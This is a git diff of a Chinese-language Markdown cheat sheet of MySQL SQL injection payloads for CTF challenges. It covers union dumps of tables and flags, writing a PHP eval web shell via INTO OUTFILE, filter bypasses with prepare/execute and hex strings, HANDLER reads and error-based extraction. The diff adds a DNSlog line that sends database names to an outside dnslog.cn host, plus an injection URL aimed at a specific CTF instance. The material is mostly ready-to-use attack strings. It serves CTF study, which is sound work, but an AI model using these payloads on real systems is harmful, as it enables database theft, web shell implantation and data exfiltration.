@@ -3,12 +3,14 @@
 ```tex
 # @Author:Y4tacker
 # 查数据库
-payload="-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
+payload = "-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"
 # 查列名
-payload="-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"
+payload="-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"
 # 查flag
 payload="-1'union select id,username,password from ctfshow_user --+"
 ```
+
+
 
 ## mysql8新特性
 
@@ -127,6 +129,18 @@ mysql> select ((1,'Dumb','D')<(table users limit 1));
 
 ## 写马（文件）
 
+**检查权限**
+
+```sql
+show variables like '%secure%';
+```
+
+查看MySQL是否有读写文件权限
+
+结果中secure_file_prive需要不为null
+
+**写**
+
 ```sql
 id=0' union select 1,"<?php eval($_POST[1]);?>" into outfile "/var/www/html/1.php%23"
 
@@ -134,14 +148,18 @@ id=1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.t
 ```
 
 题目直接给了个写文件的语句
+
 ```sql
 select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';
 ```
+
 但是写入的内容不可控，不过呢into outfile后面还可以跟lines terminated by
 比如
+
 ```sql
 select * from ctfshow_user into outfile a.txt' lines terminated by 'abc';
 ```
+
 这样所有查询出来的数据结尾都会加一个abc，并且写入到a.txt中
 payload
 
@@ -153,6 +171,12 @@ filename=1.php' lines terminated by '<?php eval($_POST[1]);phpinfo();?>'%23
 除了上面说的`lines terminated by`还有
 `lines starting by`
 `fields terminated by`
+
+## DNSlog注入
+
+```sql
+select load_file(concat("//",(select database()),"zfzyk9.dnslog.cn/123"))
+```
 
 ## 常用函数和运算符总结
 
@@ -297,6 +321,7 @@ execute name;								# 执行预定义语句
 1;update(ctfshow_user)set`username`=1;
 1;update(ctfshow_user)set`pass`=1;
 ```
+
 ```sql
 #获取表名
 ?username=1';prepare h from 0x73686f77207461626c6573;execute h;
@@ -320,19 +345,25 @@ execute name;								# 执行预定义语句
 payload: 1';rename table `words` to `a`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);
 接着直接 1’ or 1=1# 即可查询出flag。
 ```
+
 0x02 预处理（set + prepare + execute）
+
 ```
 因为 set后面是字符串所以我们可以用拼接或者十六进制的方式绕过过滤。
 
 payload:1'; Set @a=concat("sele","ct flag from `1919810931114514`");prepare h from @a;execute h;或者
 1'; Set @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare h from @a;execute h;
 ```
+
 0x03 命令执行
+
 ```
 介于0x02的方法上，我们还可以深入些，比如写入木马，只需要将 @a后面的字符串修改下即可，比如 @a=select “<?php eval($_POST['a']);?>” into outfile"/var/www/html/1.php"，当然我们不可能直接这么写，需要转成16进制。我们也可以，当然我们更能自己写一个查询语句，不过这样做有些多此一举。
 那么如果这道题增加了过滤（ select，set，prepare，rename）怎么办呢？
 ```
+
 0x04 handler
+
 ```
 介绍一下这个函数，有类似于select的功能，更强大的是，他可以在不知道字段名的前提下查询出字段的值。
 payload：1';handler `1919810931114514` open as aaa;handler aaa read first;
@@ -391,6 +422,7 @@ update ctfshow_user set pass = '...',username=database()#'
 ## 报错注入
 
 **1.floor()**
+
 ```sql
 id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
 ```
@@ -398,6 +430,7 @@ id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x f
 floor替换成ceil或者round
 
 **2.extractvalue()**
+
 ```sql
 id = 1 and (extractvalue(1, concat(0x5c,(select user()))))
 ```
@@ -405,14 +438,21 @@ id = 1 and (extractvalue(1, concat(0x5c,(select user()))))
 ```sql
 startid=extractvalue(1,concat('~',(table/**/flag1)))--&endid=1
 ```
+
 `table`列出表中全部内容
 
 **3.updatexml()**
+
 ```sql
 id = 1 and (updatexml(0x3a,concat(1,(select user())),1))
 ```
 
+```sql
+http://eci-2ze4a7qin4ony7tlbbey.cloudeci1.ichunqiu.com/?name=year from `sale_datetime`)) and updatexml(1,concat(1,(select mid(flag,9,40) from flag),1),1)%23
+```
+
 **4.exp()**
+
 ```sql
 id =1 and EXP(~(SELECT * from(select user())a))
 ```
@@ -429,11 +469,13 @@ id = 1 AND multilinestring((select * from(select * from(select user())a)b))
 ```
 
 **linestring()**
+
 ```sql
 id = 1 AND LINESTRING((select * from(select * from(select user())a)b))
 ```
 
 **multipolygon()**
+
 ```sql
 id =1 AND multipolygon((select * from(select * from(select user())a)b))
 ```
@@ -462,6 +504,7 @@ id =1 AND multipolygon((select * from(select * from(select user())a)b))
 #获取数据
 1' union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
 ```
+
 **6.**
 uuid相关函数	8.0.x	`UUID_TO_BIN ` `BIN_TO_UUID`
 BIGINT溢出	5.5.5及其以上版本
